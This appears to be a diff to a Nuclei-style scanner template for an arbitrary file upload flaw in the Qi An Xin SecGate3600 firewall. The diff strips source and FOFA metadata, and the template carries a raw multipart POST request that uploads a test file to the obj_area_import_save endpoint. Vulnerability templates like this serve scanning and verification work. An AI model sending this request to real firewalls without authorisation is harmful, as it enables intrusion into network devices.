@@ -3,12 +3,8 @@ info:
   name: 奇安信网神SecGate3600防火墙obj_area_import_save任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/stm51npfdifl50ru'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: stm51npfdifl50ru
-    fofa: fid="1Lh1LHi6yfkhiO83I59AYg=="
 http:
 - raw:
   - 'POST /?g=obj_area_import_save HTTP/1.1
@@ -17,14 +13,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqvzqvmt
 
 
-
-
     ------WebKitFormBoundarybqvzqvmt
 
 
     Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-
 
 
     10000000
@@ -39,8 +31,6 @@ http:
     Content-Type: text/plain
 
 
-
-
     dudesite
 
 
@@ -50,8 +40,6 @@ http:
     Content-Disposition: form-data; name="submit_post"
 
 
-
-
     obj_app_upfile
 
 
@@ -59,8 +47,6 @@ http:
 
 
     Content-Disposition: form-data; name="__hash__"
-
-
 
 
     0b9d6b1ab7479ab69d9f71b05e0e9445
